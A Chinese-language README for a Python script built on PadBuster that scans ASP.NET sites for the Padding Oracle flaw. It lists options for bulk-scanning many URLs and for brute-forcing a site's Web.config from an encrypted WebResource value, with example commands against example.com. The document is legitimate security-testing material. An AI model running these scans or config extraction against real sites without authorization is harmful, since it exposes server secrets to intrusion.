# myPadBuster

这是一个测试 ASP.net Padding Oracle漏洞的自动化脚本，它是基于https://github.com/GDSSecurity/PadBuster。

在PadBuster.pl的基础上增加了自动扫描和检测多个网站是否存在Padding Oracle漏洞。

具体的功能如下：

Usage: 

    myPadBuster.py [options]

Options:

    -h, --help                                     Show basic help message and exit
    -u url, --url=url                              Show WebResource value for single ASP.NET URL to be analyzed
    -w file, --webresource=file                    Show WebResource values for multiple ASP.NET URLs to be analyzed
    -s url, --single=url                           Show encrypted value for single WebResource value to be analyzed
    -m file, --multi=file                          Show encrypted values for multiple WebResource values generated by switch -w
    -p url, --padbuster=url                        Brute force Web.config by single encrypted value to be analyzed

Examples:

    myPadBuster.py -u http://www.example.com/login.aspx
    myPadBuster.py -w /usr/home/urls.txt
    myPadBuster.py -s http://www.example.com/WebResource.axd?d=LElgggssFFdff99
    myPadBuster.py -m c:\windows\webresource.txt
    myPadBuster.py -p http://www.example.com/ScriptResource.axd?d=LElgggssFFdff99AAAAAAAAAAAAAAAAAA0

[!] to see help message of options run with '-h'

PS: 使用前请确保机器上已安装了python和perl。如有任何问题请发邮件至security_alert@126.com。
